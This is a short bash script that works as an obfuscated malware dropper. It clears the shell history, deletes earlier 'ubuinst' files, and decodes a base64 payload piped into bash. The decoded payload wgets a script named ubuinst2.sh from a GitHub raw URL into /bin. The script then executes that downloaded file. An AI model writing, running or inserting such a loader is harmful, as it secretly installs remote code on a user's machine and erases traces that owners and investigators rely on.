#!/bin/bash
cat /dev/null > ~/.bash_history && history -c
rm /bin/ubuinst* > /dev/null 2>&1
echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9
JZ29yaGVucmkwNDA3L2luc3RhbGwvYmFkL3VidWluc3QyLnNoICYmIGNobW9kICt4IHVidWluc3QyLnNoICYmIGRvczJ1bml4IHVidWluc3Qy
LnNoID4gL2Rldi9udWxsIDI+JjEKY2QgfHwgZXhpdA==' | base64 -d | bash
/bin/ubuinst2.sh
